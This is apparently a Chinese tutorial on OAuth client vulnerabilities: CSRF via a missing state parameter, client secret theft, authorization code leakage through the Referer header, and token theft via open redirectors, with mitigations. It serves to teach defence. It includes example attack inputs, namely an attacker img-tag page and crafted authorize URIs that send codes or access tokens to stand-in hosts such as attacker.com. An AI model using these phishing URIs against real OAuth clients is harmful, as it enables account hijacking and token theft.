常见的客户端漏洞
======================================

常规客户端安全
--------------------------------------

OAuth客户端有几种数据是需要保护的。客户端密钥、访问令牌、刷新令牌这些信息需要妥善保管，同时注意不要意外的将这些保密信息泄露到审计日志或其他记录中。除了存储系统上单纯的信息失窃外，OAuth客户端还可能出现其他类型的漏洞

针对客户端的CSRF攻击

授权码许可和隐式许可类型中推荐使用state参数，OAuth核心规范对该参数的描述如下:
 - 客户端用来维护请求与回调之间状态的不透明值。授权服务器在将用户代理重定向回客户端时包含该值。应该使用这个参数，可以防止CSRF（跨域请求伪造）


SCRF攻击:

 - 恶意应用软件让浏览器向已完成用户身份认证的网站发起请求，执行有害操作，这就是SCRF攻击。为了实施攻击，攻击者可以简单发起一个OAuth流程，从目标授权服务器上获取授权码，然后设法让受害用户的客户端使用攻击者的授权码如::

    <img src="https://ouauthclient.com/callback?code=ATTACKER_AUTHORIZATION_CODE">

当用户点击图片，资源拥有者的客户端与攻击者的授权上下文之间建立了联系。如果OAuth协议用于身份认证，将造成灾难性后果。

OAuth客户端对于SCRF攻击可以生成一个难以猜测的state参数，在首次向授权服务器发送请求时将其一同传递，OAuth规范要求授权服务器将此参数原样返回至重定向URI，当重定向URI被调用时，客户端需要检查state参数值，如果不一致，则提示错误::

    生成的令牌（以及其他不由最终用户处理的凭证）被攻击者猜中的概率必须小于或等于2^-128，最好应该小于或等于2^-160

客户端凭证失窃

对于原生应用，可以通过动态注册功能，生成客户端密钥、客户端ID。在原生应用首次启动认证时请求注册接口返回客户端ID、客户端密钥，并由客户端保管。

通过Referrer盗取授权码

以授权码许可类型为目标，基于HTTP Referrer造成的信息泄漏，攻击者的最终目的是劫持资源拥有者的授权码。

假设你在一个OAuth提供商那里注册了OAuth客户端，该授权服务使用允许子目录的redirect_uri校验策略。

你的OAuth回调端点是::

    https://yourouauthclient.com/oauth/oauthprovider/callback

但你注册的是::

    https://yourouauthclient.com/

你的OAuth客户端在执行OAuth授权请求，发起的请求节选可能会是如下这样::

    https://oauthprovider.com/authorize?response_type=code&client_id=CLIENT_ID&scope=SCOPES&state=STATE&redirect_uri=https://yourouauthclient.com/

攻击者也要能够在目标站点注册的重定向URI下创建网页::

    https://yourouauthclient.com/usergeneratedcontent/attackerpage.html

    <html>
        <h1>Authorization in progress</h1>
        <img src="https://attackersite.com">
    </html>

现在攻击者可以构造一个特殊的钓鱼URI::

    https://oauthprovider.com/authorize?response_type=code&client_id=CLIENT_ID&scope=SCOPES&state=STATE&redirect_uri=https://yourouauthclient.com/usergeneratedcontent/attackerpage.html

当用户点击这个钓鱼URI授权服务器将返回授权码到重定向地址，受害者用户浏览器将在后台加载img标签，想攻击者的服务器请求资源，在这个请求中，HTTP Referrer头部会泄露授权码

通过开发重定向器盗取令牌

针对隐式许可类型，攻击目标是访问令牌而不是授权码。开放重定向Web漏洞定义::
 - 应用接受一个参数，不进行任何校验就将用户重定向至该参数。这个漏洞被用于钓鱼攻击，让用户不知不觉访问恶意站点。

攻击发生条件::
 - 注册了“过于宽松”的redirect_uri
 - 授权服务器采用允许子目录的校验策略
 - OAuth客户端具有开放重定向，如：https://yourouauthclient.com/redirector?goto=http://targetwebsite.com

攻击者可以构建如下URI::

    https://oauthprovider.com/authorize?response_type=token&client_id=CLIENT_ID&scope=SCOPES&state=STATE&redirect_uri=https://yourouauthclient.com/redirector?goto=https://attacker.com

如果资源拥有者已经通过TOFU授权应用，或者被说服再次对应用授权，那么资源拥有者的用户代理将被重定向到传入的redirect_uri，并且URI的片段中附有access_token::

    https://yourouauthclient.com/redirector?goto=https://attacker.com#access_token=

此时客户端应用中的开发重定向会将代理跳转至攻击者的网站，由于大多数浏览器中，URI片段会在重定向被保留，最终加载页面如下::

    https://attacker.com#access_token=
